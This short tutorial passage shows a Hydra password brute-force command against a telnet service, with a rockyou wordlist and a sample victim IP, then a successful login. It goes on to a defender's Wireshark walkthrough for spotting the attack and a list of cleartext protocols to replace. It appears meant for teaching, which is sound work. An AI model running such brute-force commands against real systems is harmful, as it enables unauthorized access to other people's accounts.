The hacker will use an attack like this:

````
hydra -v -V -l username -P wordlist -t number_of_parallel_connections ip_victim protocol_to_use

#Example
hydra -v -V -l john -P /usr/share/wordlists/rockyou.txt -t 8 10.0.0.101 telnet
````

If it works, the hacker will connect:
````
telnet

> login: john
> password: 1234
````
Now, the hacker has a shell.

ETHICAL HACKER

Now we scan this with Wirshark

- Click on any packet using telnet and click on follow TCP Stream
- We will have a message saying `No more connections are allowed to telnet server. Please try again later..john.`
- Click on another previous packet using telnet and click on follow TCP Stream
- We will find the commands that the attacker used with the credentials of the hacked user

This is a list of **clear text protocols**, in whose you can watch credentials clearly:
- Internet - HTTP
- File transfer - FTP / TFTP
- Email - POP3 / IMAP / SMTP
- Telnet
- VoIP

A solution for this is to replace this protocols by others that are more secure.
